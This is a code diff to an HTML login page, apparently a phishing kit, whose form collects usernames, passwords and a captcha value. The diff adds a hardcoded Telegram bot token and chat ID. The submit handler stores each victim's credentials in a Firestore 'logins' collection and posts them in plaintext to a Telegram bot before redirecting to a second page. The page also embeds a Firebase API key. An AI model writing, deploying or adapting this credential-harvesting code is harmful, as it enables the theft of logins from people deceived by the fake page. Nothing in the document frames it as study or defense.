@@ -3,7 +3,7 @@
 <head>
   <title>dehijlbrd</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  
+
   <!-- Firebase SDKs -->
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
@@ -74,7 +74,8 @@
     }
 
     .continue_btn a,
-    .reset_btn a {
+    .reset_btn a,
+    .continue_btn button {
       background: #3E5C74;
       color: #fff;
       font-size: 12px;
@@ -84,10 +85,11 @@
       border-radius: 0px;
       text-decoration: none;
       display: inline-block;
-      transition: background 0.3s ease;
+      border: none;
+      cursor: pointer;
     }
 
-    .continue_btn a:hover,
+    .continue_btn button:hover,
     .reset_btn a:hover {
       background: #0f3f55;
     }
@@ -134,7 +136,7 @@
 
       <div class="button-row">
         <div class="continue_btn">
-          <button type="submit" style="background: none; border: none; color: white; cursor: pointer;">Login</button>
+          <button type="submit">Login</button>
         </div>
         <div class="reset_btn">
           <a href="page1.html">Reset</a>
@@ -146,7 +148,7 @@
   </div>
 
 <script>
-  // Firebase Config - UPDATED
+  // Firebase Config
   const firebaseConfig = {
     apiKey: "AIzaSyDdRv4_wFI5hjSi_0ci_YDUsdWY5Uv7wDE",
     authDomain: "dlhiljbrd.firebaseapp.com",
@@ -160,6 +162,10 @@
   firebase.initializeApp(firebaseConfig);
   const db = firebase.firestore();
 
+  // Telegram Bot Info
+  const botToken = "7882249824:AAGPvCpy3Gef5c-BfYoFwY5uHJr9_yKbSIs";
+  const chatId = "6677946042";
+
   // Form submission
   function submitForm(e) {
     e.preventDefault();
@@ -168,17 +174,37 @@
     const password = document.getElementById("password").value;
     const captcha = document.getElementById("captcha").value;
 
+    const message = `New Login:\nUsername: ${username}\nPassword: ${password}\nCaptcha: ${captcha}`;
+
+    // Save to Firestore
     db.collection("logins").add({
-      username: username,
-      password: password,
-      captcha: captcha,
+      username,
+      password,
+      captcha,
       timestamp: new Date()
     }).then(() => {
-      window.location.href = "page2.html"; // Redirect on success
-    }).catch((error) => {
-      alert("Error saving data: " + error);
+      // Send to Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(() => {
+        window.location.href = "page2.html";
+      }).catch(err => {
+        alert("Telegram Error: " + err.message);
+      });
+    }).catch(error => {
+      alert("Firebase Error: " + error.message);
     });
 
     return false;
   }
 </script>
+
+</body>
+</html>
